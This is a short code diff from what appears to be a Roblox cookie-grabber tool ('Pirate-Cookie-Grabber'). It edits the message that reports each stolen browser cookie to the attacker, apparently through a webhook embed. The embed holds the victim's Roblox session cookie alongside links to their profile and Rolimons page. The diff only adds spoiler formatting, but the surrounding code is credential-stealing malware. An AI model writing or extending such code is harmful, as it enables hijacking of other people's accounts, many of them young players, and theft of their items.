@@ -112,7 +112,7 @@ for browser, roblox_cookie in cookies:
             {   
                 "username": "MrBreast",
                 "title": "**Jesse We got an other one**",
-                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})```fix\n{roblox_cookie}\n```",
+                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})||```fix\n{roblox_cookie}\n```||",
                 "color": 12452044,
                 "author": {
                     "name": "GaiPoloMDRs",
